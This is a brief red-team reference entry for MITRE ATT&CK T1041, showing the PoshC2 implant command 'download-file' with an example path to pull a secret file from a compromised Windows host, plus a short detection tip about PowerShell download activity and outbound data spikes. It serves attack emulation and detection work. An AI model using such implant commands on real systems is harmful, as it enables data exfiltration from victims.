# [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041/)

## **Exploit Description:** 

Download command in PoshC2

## **Exploit syntax:**

* Download file directly from implant
```powershell
download-file <file path> 
Example: download-file 'C:\\Users\\Public\\SuperSecretData.txt'
```

## **Detection Technique:**
* Investigate powershell with the “download” command. Investigate increased data transfer external to the network during a network connection.
